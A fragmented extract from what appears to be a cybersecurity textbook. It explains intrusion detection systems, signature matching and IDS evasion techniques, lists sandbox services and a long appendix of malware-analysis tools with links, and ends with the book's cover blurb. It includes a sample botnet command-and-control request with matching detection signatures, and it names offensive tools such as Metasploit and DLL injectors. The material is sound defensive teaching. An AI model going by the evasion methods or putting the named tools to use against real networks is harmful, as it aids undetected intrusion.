describes a network detection solution called an intrusion detection 
system (IDS).
[Word Count: 78]

Norman Sandbox
http://www.norman.com/security_center/security_tools/submit_file/en-us
Sunbelt CWSandbox
http://www.sunbeltsoftware.com/Developer/Sunbelt-CWSandbox/
Anubis
http://anubis.iseclab.org/index.php
ThreatExpert
http://www.threatexpert.com
TRUMAN
http://www.secureworks.com/research/tools/truman.html
Comodo
http://camas.comodo.com
BitBlaze
https://aerie.cs.berkeley.edu
JoeBox
http://www.joebox.org
[Word Count: 18]

An IDS is a device that monitors network traffic for malicious 
activity. IDS devices, referred to as sensors, detect malicious activ­
ity by searching through traffic that traverses a network. The IDS 
sensor requires access to network packets, which is possible through 
two different implementations called out of line and inline. Exhibit 5-9 
shows the difference in network topologies between out-of-line and 
inline sensors.
[Word Count: 64]

Inline sensors differ from out-of-line sensors in that they physically 
sit in the path of the network traffic. Network traffic travels from its 
source through the inline device to its destination. The inline sensor 
checks the traffic sent through it for malicious activity to produce 
alerts or block the malicious activity. Inline sensors configured to 
block malicious traffic, known as intrusion prevention systems (IPSs), 
have a greater impact on reducing the occurrence of malicious activity 
on a network.
[Word Count: 78]

Exhibit 5-9  Out-of-line and inline topologies.
[Word Count: 6]

Both types of sensors use rules, also known as signatures, to detect 
malicious activity. IDS sensors rely on these signatures to detect mali­
cious activity; therefore, the overall effectiveness of an IDS sensor 
mostly depends on the caliber of the signatures. Most IDS vendors 
have different rule structures or languages, but such rules generally 
use content matching and anomalies to detect events.
[Word Count: 62]

Example HTTP request:
GET /controller.php?action=bot&entity_list=&uid=1&firs
t=1&guid=412784631&rnd=94
[Word Count: 6]

Content Match
“GET /controller.php?action=“
[Word Count: 4]

Regular Expression
“/GET\s/controller.php?action=(bot|loader|report)/”
[Word Count: 3]

Sensors also detect malicious activity based on anomalous network 
traffic. These anomalies include protocol-specific anomalies and traffic 
thresholds. Network protocols abide by standards, and abnormalities 
to these standards are an indication of suspicious activity. Signature 
authors capitalize on these protocol abnormalities to detect malicious 
activity. For example, Exhibit 5-10 shows such a protocol anomaly 
witnessed within the HTTP header of a GET request generated by 
an infected client. The malicious code author added the fields SS and 
xost to the header, allowing for easy detection by an IDS signature as 
they are not part of the HTTP protocol.
[Word Count: 98]

Traffic thresholds detect anomalous increases in traffic compared 
to a baseline amount of traffic. This approach requires a baseline fig-
ure that accurately represents the normal amount of traffic expected to
[Word Count: 31]

observe an increase. The baseline figure needs constant adjustments to 
reflect legitimate increases and decreases in traffic patterns. Without 
these adjustments, the IDS will generate many alerts on legitimate 
traffic and waste investigative resources. Threshold-based detection 
does not often detect a specific threat but provides a heuristic approach 
to malicious activity detection. These events require investigation to 
determine the specific issue, as they are prone to trigger on nonmali­
cious traffic.
[Word Count: 71]

By name, IDS suggests that such systems simply detect inbound 
attempts to gain entry to a device; in reality, they have the ability to 
detect much more. An IDS device can detect any type of malicious 
activity that traverses a network based on the rules used for detection, 
with some exceptions described later in this section. The success of an 
IDS device in detecting a particular event depends on the accuracy 
and flexibility of the signatures within its rule set.
[Word Count: 80]

A rule set is a list of signatures that the IDS device uses to detect 
malicious activity. IDS vendors supply a rule set for their products, 
and many allow the creation of custom signatures. The signatures 
within these sets can detect inbound attacks on servers and clients, 
malicious code infections, and propagation.
[Word Count: 52]

An IDS device has the ability to detect inbound attacks on a server 
or client from specially crafted signatures. To detect these attacks, the 
signature author needs prior knowledge of the attack or the vulner-
ability to match its network activity. Equipped with a signature for 
the attack or vulnerability, the IDS sensor can detect the activity and 
trigger an alert for the possible compromise on the destination. The
[Word Count: 69]

Exhibit 5-10  Abnormal fields within an HTTP header.
[Word Count: 8]

IDS, however, is unable to determine if the end system was vulnerable 
to the detected attack. An investigation is pivotal to determine if the 
attack was successful.
[Word Count: 27]

Rules can also detect worm propagation via content matches or 
anomalies. The content match approach requires prior knowledge of 
the network activity the worm generates when it attempts to spread 
to other systems. A signature match provides the source of the worm 
propagation, which is an infected system that needs remediation. An 
investigation of the destination in this event will determine if the 
worm successfully spread to the system.
[Word Count: 69]

IDS devices detect a variety of threats to a network, but they do 
have issues that limit their effectiveness. IDS evasion is a concept that 
encompasses all techniques used to avoid detection during malicious
[Word Count: 34]

activity. Varieties of techniques are available, but the most common 
evasion methods include obfuscation, encryption, compression, and 
traffic fragmentation.
[Word Count: 19]

Obfuscation, encryption, and compression can evade detection from 
an IDS. IDS signatures searching for content as the result of mali­
cious activity have difficulty matching if the known patterns change. 
Although obfuscation, encryption, and data compression are different 
in functionality and purpose, all three change the representation of 
data transmitted over the network. Obfuscation of data and exploit 
code evades detection through structural changes while retaining its 
original functionality through encoding, concatenation, and obscure 
variable and function names.
[Word Count: 78]

Encryption of data or the network traffic itself can evade detec­
tion from an IDS. An IDS signature can detect malicious activity 
within unencrypted channels by searching for malicious content 
within cleartext data sent over the network; however, an IDS has 
difficulty detecting malicious activity within encrypted communica­
tions because it does not have the key to decrypt the cipher text into 
cleartext data.
[Word Count: 64]

Traffic fragmentation and reassembly can also evade IDS. Malicious 
activity split into multiple different packets and sent from the source 
to the destination requires the IDS to reassemble the fragmented 
packets before inspecting the traffic.28 For example, an attacker can 
spread the transmission of the attack’s payload across fifty packets. 
To detect the attack payload, the IDS sensor has to track and reas-
semble the fifty packets in memory and then scan the reassembled 
payload using the rule set. Many fragmentation techniques are avail-
able to further complicate IDS evasion, such as fragment overlapping,
[Word Count: 94]

overwriting, and timeouts, but such techniques do not fit inside the 
scope of this book.
[Word Count: 15]

In addition to IDS evasion techniques, the network environment 
that the IDS sensor monitors can affect the sensor’s ability to detect 
malicious activity. Placement of the IDS sensor is key to monitoring 
the appropriate traffic. Overlooking sensor placement leads to visibil­
ity issues, as the sensor will not monitor the correct traffic.
[Word Count: 52]

Placement in high-traffic areas can severely affect the performance 
of the IDS sensor. Sensors in high-traffic environments require a great 
deal of hardware to perform packet inspections. Packet inspections 
become more resource intensive as the amount of traffic increases; if 
the sensor does not have enough resources, it will fail to detect the 
malicious traffic. This results in the IDS not creating an alert about 
the malicious activity.
[Word Count: 68]

The rule set used by the IDS sensor also affects the sensor’s detec­
tion performance. To increase performance, each IDS vendor uses 
different rule set optimization techniques. Despite the optimization 
techniques used, the sensor checks all traffic monitored for signature 
matches. Checking traffic with a smaller set of rules will result in 
faster performance but fewer rules with which to detect malicious 
content. Larger rule sets will perform slower than a smaller set but 
have more rules for detecting malicious activity. This shows the need 
for compromise between speed and threat coverage.
[Word Count: 92]

Threat coverage shows the need for another compromise. An over­
flow of alerts will dilute critical alerts and valuable information with 
low-priority alerts and useless data. This dilution caused by excess 
noise makes triaging alert investigation difficult. The rule set for a 
sensor needs constant attention and custom tuning to reduce the 
number of alerts about legitimate traffic.
[Word Count: 58]

The last consideration for sensor placement involves inline devices. 
Inline devices physically sit between two network devices and have 
the ability to block malicious activity; however, legitimate traffic can 
also match signatures for malicious activity. This situation occurs 
often and results in the sensor blocking legitimate traffic. Another 
situation in which an IDS device can block traffic occurs when the 
sensors go offline or are overwhelmed with traffic. If the device does 
not fail to open in the event of system failure, then the device will
[Word Count: 86]

block all traffic at its network interface. The inline device will also 
drop traffic if it exceeds its processing power.
[Word Count: 20]

Despite the issues facing IDSs, they are still beneficial to the secu­
rity of a network. Proper consideration to the network environment 
that the IDS sensor will monitor is a must. An appropriate oper­
ating environment can reduce the issues previously discussed that 
plague a sensor’s ability to detect malicious activity. Supplementing 
a proper network environment with continuous updates and tuning 
of the sensor’s rule set will provide excellent coverage for a majority 
of malicious events.
[Word Count: 76]

IDS devices provide an invaluable stream of information to aid 
in security investigations and to improve the overall security of a 
network. IDS sensors can improve security by detecting a network’s 
vulnerable areas and inbound attacks that can threaten the net­
work. In cases involving an inline sensor, an IDS device can greatly 
improve network security by blocking malicious activity before it 
performs malice.
[Word Count: 64]

Luckily, the vast majority of inbound attempts to compromise sys­
tems do not use the IDS evasion techniques discussed in this section. 
Attackers overlooking evasion techniques allow IDS sensors to remain 
a viable monitoring solution. IDS can also detect compromised hosts 
based on network activity; however, the coverage for threats requires 
auditing to make sure the IDS detects malicious traffic. An IDS can 
provide a false sense of security if a signature exists for a threat but 
does not properly generate an alert in the event of its occurrence.
[Word Count: 89]

1.	 D. Brezinski, “RFC3227: Guidelines for Evidence Collection and
[Word Count: 9]

Archiving,” Advameg, Inc., February 2002, http://www.faqs.org/rfcs/
rfc3227.html. 
	
2.	 Matthieu Suiche, “Matthieu Suiche’s Win32dd Tool,” n.d., http://
[Word Count: 16]

win32dd.msuiche.net/windd/. Acessed August 11, 2010.
	
3.	 Volatile Systems, “Volatility Website,” 2006–2008, http://www.volatil-
[Word Count: 12]

esystems.com/default/volatility.
	
4.	 Google Code, “Volatility: An Advanced Memory Forensics Framework:
[Word Count: 10]

Summary,” 2010, http://code.google.com/p/volatility.
	
5.	 Google Code, “Volatility: An Advanced Memory Forensics Framework:
[Word Count: 12]

Doc Files,” 2010, http://code.google.com/p/volatility/wiki/DocFiles.
[Word Count: 4]

6.	 Edgar Barbosa, “Finding Some Non-Exported Kernel Variables
[Word Count: 8]

in 
Windows 
XP,” 
n.d., 
http://www.reverse-engineering.info/
SystemInformation/GetVarXP.pdf.
	
7.	 Google Code, “Volatility Analyst Pack,” 2010, http://mhl-malware-
[Word Count: 14]

scripts.googlecode.com/files/vap-0.1.zip.
	
8.	 Lance Spitzner, “Honeytokens: The Other Honeypot,” July 16, 2003,
[Word Count: 11]

http://www.symantec.com/connect/articles/honeytokens-other-
honeypot.
	
9.	 Specter, “Specter 8.0: Intrusion Detection System,” n.d., http://www.
[Word Count: 11]

specter.com.
	 10.	 Honeynet Project, “Know Your Enemy: Honeynets,” May 31, 2006,
[Word Count: 11]

http://old.honeynet.org/papers/honeynet.
	 11.	 Nepenthes, “documentation:readme,” March 20, 2009, http://nepenthes.
[Word Count: 8]

carnivore.it/documentation:readme.
	 12.	 Honeyd Research, “Honeypots against Spam,” 1999–2004, http://www.
[Word Count: 9]

honeyd.org/spam.php.
	 13.	 https://projects.honeynet.org/capture-hpc.
	 14.	 MITRE, “Welcome to the MITRE Honeyclient Project,” 2004–2008,
[Word Count: 12]

http://www.honeyclient.org/trac.
	 15.	 Honeynet Project, “Projects,” n.d., http://honeynet.org/project/.
	 16.	 Lance Spitzner, “Honeypots: Are They Illegal?” June 11, 2003, http://
[Word Count: 18]

www.symantec.com/connect/articles/honeypots-are-they-illegal.
	 17.	 Hispasec Sistemas, “Virustotal,” n.d., http://www.virustotal.com/analisis/
[Word Count: 7]

e174a8191bba6bfd717d705765be2a1b.
	 18.	 Costin Raiu, “A Virus by Any Other Name: Virus Naming Practices,”
[Word Count: 13]

June 30, 2002, http://www.symantec.com/connect/articles/virus-any-
other-name-virus-naming-practices.
	 19.	 Examples include Symantec, “Virus Naming Conventions,” 1995–
[Word Count: 13]

2010, 
http://www.symantec.com/security_response/virusnaming.jsp; 
BitDefender, “Naming Conventions,” 2010, http://www.bitdefender.
com/site/Naming-Conventions.html; Avira, Soft SRL. http://www.avira.
rc/en/virus_information/malware_naming_conventions.html (accessed 
August 11, 2010); and McAfee in derkeiler.com, “McAfee’s Naming 
Convention of Computer Viruses, Worms and Trojans,” n.d., http://
www.derkeiler.com/Newsgroups/microsoft.public.security.virus/2003-
12/1324.html.
	 20.	 Brian Krebs, “Virus Naming Still a Mess,” 2009, http://blog.washington-
[Word Count: 44]

post.com/securityfix/2006/02/virus_naming_still_a_mess.html.
	 21.	 MITRE, “Common Malware Enumeration: CME List,” 2010, http://
[Word Count: 10]

cme.mitre.org/data/list.html.
	 22.	 For more information, see the CARO naming scheme, which describes
[Word Count: 12]

choosing names and the problems associated with virus naming, at 
Vesselin Bontchev, “Current Status of the CARO Malware Naming 
Scheme,” n.d., http://www.people.frisk-software.com/~bontchev/papers/
naming.html.
[Word Count: 23]

23.	 Foxtech, “22,000 New Malware Samples Detected Each Day,” January
[Word Count: 10]

12, 2009, http://www.foxtech.org/software-news/3-software-news/115-
22000-new-malware-samples-detected-eachday.html.
	 24.	 Norman, “Norman SandBox® Technology,” n.d., http://www.norman.
[Word Count: 11]

com/technology/norman_sandbox/the_technology/en-us.
	 25.	 Faronics, “Reduce IT Support,” 1999–2010, http://www.faronics.com/
[Word Count: 8]

html/DeepFreeze.asp.
	 26.	 CoreRESTORE, [homepage], n.d., http://www.corerestore.com/core_
[Word Count: 6]

restore.html.
	 27.	 Volatile Systems, “The Volatility Framework,” 2006–2008, https://www.
[Word Count: 9]

volatilesystems.com/default/volatility.
	 28.	 Kevin Timm, “IDS Evasion Techniques and Tactics,” May 5, 2002,
[Word Count: 12]

http://www.symantec.com/connect/articles/ids-evasion-techniques-
and-tactics.
[Word Count: 2]

305
© 2011 by Taylor & Francis Group, LLC
[Word Count: 9]

PDF Toolkit (PDFTK)
Toolkit for PDF investigations
http://www.accesspdf.com/pdftk
CHM Decompiler
Investigate compiled
[Word Count: 12]

com/?page=/scrdec/intro
GetType
Determine file type
http://philip.helger.com/gt/index.php
TrID
Determine file type
http://mark0.net/soft-trid-e.html
OffViz
Object linking and
[Word Count: 15]

archive/2009/07/31/announcing-offvis.
aspx
OfficeMalScanner
Find malicious Office
[Word Count: 6]

OfficeMalScanner.zip
Swftools
Toolkit for Flash
[Word Count: 5]

Spidermonkey
JavaScript interpreter
http://www.mozilla.org/js/spidermonkey
Pdftools
Tools by Didier Stevens
http://blog.didierstevens.com/programs/
[Word Count: 10]

pdf-tools
Flare
Flash decompiler
http://www.nowrap.de/flare.html
Nemo
Flash decompiler
http://www.docsultant.com/nemo440
Dump flash
[Word Count: 11]

Flash decompiler
http://www.softpedia.com/progDownload/
[Word Count: 3]

Dump-Flash-decompiler-
Download-39174.html
File Insight
Edit files in various formats
http://www.webwasher.de/download/
[Word Count: 10]

fileinsight
Malzilla
Malware-hunting tool
http://malzilla.sourceforge.net
Dezend
Decrypt PHP files protected
[Word Count: 10]

SYSTEM INFORMATION TOOLS
Process Hacker
Powerful ProcExp alternative
http://processhacker.sourceforge.net
Sysinternals suite
Sysinternals suite
http://download.sysinternals.com/Files/
[Word Count: 14]

InsideClipboard
Inspect clipboard contents
http://www.nirsoft.net/utils/inside_
[Word Count: 5]

clipboard.html
Winlister
Inspect Windows
http://www.nirsoft.net/utils/winlister.html
DeviceTree
Investigate drivers and
[Word Count: 9]

Microsoft Development 
[MSDN] subscription)
[Word Count: 4]

http://msdn.microsoft.com/en-us/library/
[Word Count: 1]

Mwcollectd
Malware collection daemon
http://code.mwcollect.org/projects/show/
[Word Count: 5]

mwcollectd
honeyd
Create virtual services and
[Word Count: 6]

BROWSER TOOLS
Fiddler
Web-debugging proxy for
[Word Count: 6]

IEDeveloperToolbar
Toolbar for control of IE
[Word Count: 6]

NETWORK TOOLS
Wireshark
Packer sniffer
http://www.wireshark.org
Snort
Packer sniffer and intrusion
[Word Count: 11]

Tcpdump
Packer sniffer
http://www.tcpdump.org
Chaosreader
Report generator for pcaps
http://chaosreader.sourceforge.net
Scapy
Packet manipulation in
[Word Count: 14]

Pylibpcap
Python wrappers for libpcap
http://sourceforge.net/projects/pylibpcap/
SocksiPy
Python SOCKS client module
http://socksipy.sourceforge.net
Pehunter
Snort preprocessor for
[Word Count: 16]

iDefense Special File Investigation Tools 
307
[Word Count: 6]

InetSim
Internet simulation in Perl
http://www.inetsim.org
Netcat for Windows
Netcat for Windows
http://www.securityfocus.com/tools/139
[Word Count: 13]

DISASSEMBLERS AND PLUG-INS
IDA Pro
Interactive disassembler
[Word Count: 7]

idadownfreeware.htm
BeaEngine
Disassembler (in C/Python/
[Word Count: 5]

index1.php
Distorm64
Stream disassembler (in C/
[Word Count: 6]

HexRays
Decompiler plug-in for IDA
http://www.hexrays.com
Coverit
Code coverage plug-in for
[Word Count: 11]

coverage_analyzer.html
pe_scripts
PE tools International Data
[Word Count: 6]

http://www.hex-rays.com/idapro/freefiles/
[Word Count: 1]

pe_scripts.zip
x86emu
x86 emulation plug-in for
[Word Count: 6]

plug-in (installed by 
default in IDA 5.6)
[Word Count: 7]

TurboDiff
Binary-diffing plug-in for IDA
http://corelabs.coresecurity.com/index.ph
[Word Count: 6]

p?module=Wiki&action=view&type=tool
&name=turbodiff
PatchDiff2
Binary-diffing plug-in for IDA
http://cgi.tenablesecurity.com/tenable/
[Word Count: 8]

patchdiff.php
BinDiff
Binary-diffing plug-in for IDA
[Word Count: 6]

findcrypt.html
IDA Stealth
Hide debugger plug-in for
[Word Count: 7]

VIRTUALIZATION, EMU, AND LOCKDOWN
VMware
Virtual machines application
http://www.vmware.com
VIX API
API for scripting VMware
[Word Count: 15]

developer/vix-api/
QEMU
Emulation application
http://bellard.org/qemu/index.html
Ether
Unpack using hardware
[Word Count: 9]

http://ether.gtisc.gatech.edu/source.html
[Word Count: 1]

http://www.faronics.com/html/deepfreeze.
[Word Count: 1]

PIN
Instrumentation
http://rogue.colorado.edu/pin/
Virtual Box
Virtual machines application
http://www.virtualbox.org
[Word Count: 9]

PACKING AND UNPACKING TOOLS
Saffron
Automated unpacker for
[Word Count: 8]

tools/index.php/
Category:Unpacking_Tools
ImpREC
Imports reconstructor
http://www.woodmann.com/collaborative/
[Word Count: 6]

tools/index.php/ImpREC
UIF
Universal imports fixer
http://www.woodmann.com/collaborative/
[Word Count: 6]

tools/index.php/Universal_Import_Fixer
UPX
PE packer
http://upx.sourceforge.net
PEiD
Packer identification tool
http://peid.has.it
UserDB.TXT
PEiD signature database
http://www.peid.info/BobSoft/Downloads/
[Word Count: 15]

tools/index.php/LordPE
Procdump
Process and DLL dumping
[Word Count: 6]

firemansam/962/html/procdump.html
mkepe
PE fix-up tool
ftp://ftp.sac.sk/pub/sac/utilprog/
[Word Count: 6]

TOOLS FOR PE FILES
Explorer Suite
Integrated development
[Word Count: 8]

environment (IDE) for PE 
tool view and edit
[Word Count: 8]

Stud_PE
Inspect PE file headers
http://www.cgsoftlabs.ro/studpe.html
SADD
Section-adding tool
http://programmerstools.org/system/
[Word Count: 10]

files?file=sadd1.0.zip
StripReloc
Strip relocations from PE
[Word Count: 6]

PE Checksum
Update PE checksum values
http://www.codeproject.com/KB/cpp/
[Word Count: 7]

PEChecksum.aspx
petools
Patch PE files and add new
[Word Count: 8]

petools.html
Pefile
Library in Python to
[Word Count: 6]

iDefense Special File Investigation Tools 
309
[Word Count: 6]

Microsoft C/++ compiler IDE
http://www.microsoft.com/express/
[Word Count: 5]

Downloads/#2008-Visual-CPP
WDK
Windows Driver Kit
http://www.microsoft.com/whdc/DevTools/
[Word Count: 6]

WDK/WDKpkg.mspx
Netfilter
Transport driver interface
[Word Count: 5]

native-nt-toolkit
Header files for native API
[Word Count: 6]

toolkit/
Nasm
Netwide assembler
http://nasm.sourceforge.net
Masm32
Microsoft assembler
http://www.masm32.com/masmdl.htm
kmdkit
Kernel mode driver
[Word Count: 13]

Wine source code
Wine source code
http://www.codeweavers.com/support/
[Word Count: 7]

docs/wine-user/getting-wine-source
Python
Python language
http://www.python.org
Perl
Perl for Windows
http://www.activestate.com/activeperl/
MinGW
GNU Compiler Collection
[Word Count: 14]

PyScripter
Python IDE
http://www.mmm-experts.com/Products.
[Word Count: 4]

aspx?ProductId=4
Pywin32
Python library for accessing
[Word Count: 6]

http://sourceforge.net/projects/pywin32/
[Word Count: 1]

OpenSSL
Cryptography library in C
http://www.openssl.org
Yara
Malware classification
[Word Count: 9]

shtml
Burp suite
Proxy with fuzzer tools
http://portswigger.net/suite/
[Word Count: 8]

COM TOOLS
oleretools
Perl scripts for COM
[Word Count: 7]

Comtypes
COM in Python
http://sourceforge.net/projects/comtypes
[Word Count: 5]

DEBUGGERS AND PLUG-INS
Olly debugger
User mode debugger
http://www.ollydbg.de
PhantOm
Hide debugger plug-in for
[Word Count: 14]

tools/index.php/PhantOm
OllyBonE
Break on execute plug-in for
[Word Count: 7]

tools/index.php/OllyBonE
PE Dumper
Process and DLL dump
[Word Count: 7]

tools/index.php/PE_Dumper
OllyScript
Scripting language for Olly
https://sourceforge.net/project/showfiles.
[Word Count: 7]

php?group_id=195914
Immunity debugger
Olly + Python API + Immunity
http://www.immunitysec.com/products-
[Word Count: 10]

OllyDbg plug-ins for ImmDbg
http://www.tuts4you.com/download.
[Word Count: 5]

php?list.74
Windbg
Debugging tools for Windows
[Word Count: 6]

Debugging/default.mspx
PowerDbg
Scriptable plug-ins for
[Word Count: 5]

API HOOKING
Rohitab API Monitor
Log API calls and parameters
http://www.rohitab.com/apimonitor/index.
[Word Count: 11]

html
Sysanalyzer
iDefense Malcode Analyst
[Word Count: 5]

malcode.php#more_sysanalyzer
Madshi
API hooking library
[Word Count: 5]

Mhook 
API hooking library in C 
http://codefromthe70s.org/mhook22.aspx
Detours 
Microsoft’s API-hooking
[Word Count: 10]

http://research.microsoft.com/sn/detours
[Word Count: 1]

CaptureBat 
Honeynet project API monitor 
https://www.honeynet.org/node/315
[Word Count: 6]

MEMORY ANALYSIS
win32dd 
Dump physical memory 
http://win32dd.msuiche.net
pmdump 
Dump individual process
[Word Count: 11]

pmdump/
F-Response 
Remote read-only drive
[Word Count: 5]

iDefense Special File Investigation Tools 
311
[Word Count: 6]

HBGary Fastdump 
Dump physical memory fast 
http://www.hbgary.com/products-
[Word Count: 7]

services/fastdump-pro/
HBGary Flypaper 
Block memory-free functions 
https://www.hbgary.com/products-
[Word Count: 7]

services/flypaper/
Volatility 
Memory forensics framework
[Word Count: 5]

https://www.volatilesystems.com/default/
[Word Count: 1]

volatility
Volatility plug-ins 
Volatility plug-ins 
http://www.forensicswiki.org/wiki/
[Word Count: 6]

List_of_Volatility_Plugins
HBGary Responder 
Memory forensics platform for
[Word Count: 7]

http://www.hbgary.com/responder_pro.html
[Word Count: 1]

memoryze.htm
PTFinder 
Memory forensic tools in Perl 
http://computer.forensikblog.de/
[Word Count: 8]

en/2007/11/ptfinder_0_3_05.html
Sandman 
C library to analyze
[Word Count: 6]

ONLINE SERVICES
VirusTotal 
Online virus scanner 
http://www.virustotal.com
CWSandbox 
Online behavior monitor 
http://www.cwsandbox.org
Team Cymru ASN 
Internet Protocol (IP) to
[Word Count: 19]

Autonomous System 
Number (ASN) lookup tool
[Word Count: 6]

JoeBox 
Online behavior monitor 
http://www.joebox.org
MalwareDomainList 
Tracking exploits site 
http://www.malwaredomainlist.com
Anubis 
Online behavior monitor 
http://anubis.iseclab.org
Threat Expert 
Online behavior monitor 
http://www.threatexpert.com
Jsunpack 
Unpack JavaScript 
http://jsunpack.jeek.org/dec/go
Wepawet 
Analyze PDF and Shockwave
[Word Count: 30]

ROOTKIT AND MALWARE SCANNERS
GMER 
Multifunction rootkit scanner 
http://www.gmer.net
IceSword 
Multifunction rootkit scanner 
http://www.antirootkit.com/software/
[Word Count: 14]

IceSword.htm
Rootkit Revealer 
Cross-view rootkit detector 
http://technet.microsoft.com/en-us/
[Word Count: 7]

sysinternals/bb897445.aspx
Rootkit Unhooker 
Multifunction rootkit scanner 
https://www.rootkit.com/newsread.
[Word Count: 7]

php?newsid=902
Malware Bytes 
Malware scanner 
http://www.malwarebytes.org
HijackThis 
Malware scanner 
http://www.trendsecure.com/portal/en-US/
[Word Count: 10]

BOOTABLE OS
Plain Sight 
Live forensics 
http://www.plainsight.info
[Word Count: 7]

BartPE 
Bootable Windows XP/2003 
http://www.nu2.nu/pebuilder
Helix3 
Live forensics (commercial) 
http://www.e-fense.com/products.php
CAINE 
Live forensics (free) 
http://www.caine-live.net/index.html
Knoppix 
Live Linux environment 
http://www.knoppix.net
[Word Count: 20]

FORENSIC TOOLS
RegRipper 
Forensic registry parser 
http://www.regripper.net
Windows Registry
[Word Count: 9]

Index Analyzer 
IE history file viewer 
http://www.systenance.com/indexdat.php
Scalpel 
File-carving utility 
http://www.digitalforensicssolutions.com/
[Word Count: 11]

Scalpel/
Jafat LNK Parser 
Windows shortcut and .lnk
[Word Count: 8]

Forensic acquisition utilities 
http://www.gmgsystemsinc.com/fau
[Word Count: 4]

FTK Imager (Lite) 
Capture disk and random
[Word Count: 7]

html
Live View 
Create vmdk from dd disc
[Word Count: 8]

Fatkit 
Forensic analysis toolkit 
http://www.4tphi.net/fatkit/
FTimes 
Baseline and evidence
[Word Count: 9]

index.shtml
AIDE 
Advanced intrusion detection
[Word Count: 5]

FoxAnalysis 
Firefox history analyzer 
http://forensic-software.co.uk/
[Word Count: 5]

foxanalysis.aspx
Pasco 
index.dat parsing tool 
http://odessa.sourceforge.net
R-Studio 
File recovery software
[Word Count: 10]

Setup.exe
ssdeep 
Fuzzy hashing utility 
http://ssdeep.sourceforge.net/usage.html
DBAN 
Forensic disk-wiping CD 
http://www.dban.org
sqlitebrowser 
Sqlite3 GUI database
[Word Count: 15]

REPORT GENERATION
Snippy 
Tiny screen capture program 
http://www.bhelpuri.net/Snippy/
[Word Count: 8]

SnippyDownload.htm
Camtasia Studio 
Screen-recording suite 
http://www.techsmith.com/camtasia.asp
Snapz Pro 
Screen shot and recording
[Word Count: 12]

snapzprox/
Graphviz 
Graph visualization software 
http://www.graphviz.org
[Word Count: 6]

iDefense Special File Investigation Tools 
313
[Word Count: 6]

MISCELLANEOUS TOOLS
HashCalc 
Compute hashes in various
[Word Count: 7]

RemoteDll 
Inject DLLs into processes 
http://securityxploded.com/remotedll.php
Shellcode 2 Exe 
Create EXE wrappers for
[Word Count: 13]

php
Notepad++ 
Source code editor 
http://notepad-plus.sourceforge.net/uk/
[Word Count: 6]

site.htm
VB Decompiler 
VB Decompiler 
http://www.vb-decompiler.org
IrpTracker 
Observe IOCTLs sent to
[Word Count: 11]

cfm?id=199
OpenVPN 
SSL virtual private network
[Word Count: 6]

source/downloads.html
Tor 
Anonymity online 
http://www.torproject.org
winexe 
Exec commands on Win from
[Word Count: 11]

https://sourceforge.net/projects/regshot
[Word Count: 1]

Win32kdiag 
Detect hidden mountpoints 
http://forums.majorgeeks.com/
[Word Count: 5]

showthread.php?t=198257
Metasploit 
Exploit and shellcode builder 
http://www.metasploit.com
s2b 
Shellcode-to-binary
[Word Count: 9]

Bintext 
Extract strings from binaries 
http://www.foundstone.com/us/resources/
[Word Count: 6]

proddesc/bintext.htm
Winhex 
Hex viewer 
http://www.x-ways.net/winhex.zip
Secunia PSI 
Up-to-date software scanner 
http://secunia.com/vulnerability_
[Word Count: 11]

scanning/personal/
Cygwin 
Linux environment for
[Word Count: 5]

eEye BDS 
Binary-diffing suite 
http://research.eeye.com/html/tools/
[Word Count: 5]

DOCUMENTATION AND INFORMATION
Woodman RCE
[Word Count: 5]

Reverse engineering forums
http://www.woodmann.com
[Word Count: 4]

Malware information
http://www.offensivecomputing.net
[Word Count: 3]

The sophisticated methods used in recent high-profile cyber incidents have 
driven many to need to understand how such security issues work. Demystifying 
the complexity often associated with information assurance, Cyber Security 
Essentials provides a clear understanding of the concepts behind prevalent 
threats, tactics, and procedures.
[Word Count: 45]

To accomplish this, the team of security professionals from VeriSign’s 
iDefense® Security Intelligence Services supplies an extensive review of the 
computer security landscape. Although the text is accessible to those new to 
cyber security, its comprehensive nature makes it ideal for experts who need 
to explain how computer security works to non-technical staff. Providing a 
fundamental understanding of the theory behind the key issues impacting cyber 
security, the book:
[Word Count: 69]

• Covers attacker methods and motivations, exploitation trends, malicious  
code techniques, and the latest threat vectors
[Word Count: 16]

• Addresses more than 75 key security concepts in a series of concise, well-
illustrated summaries designed for most levels of technical understanding
[Word Count: 23]

• Supplies actionable advice for the mitigation of threats
[Word Count: 9]

• Breaks down the code used to write exploits into understandable diagrams
[Word Count: 12]

This book is not about the latest attack trends or botnets. It’s about the reasons 
why these problems continue to plague us. By better understanding the logic 
presented in these pages, readers will be prepared to transition to a career in the 
growing field of cyber security and enable proactive responses to the threats and 
attacks on the horizon.
[Word Count: 59]

Total Paragraphs: 1689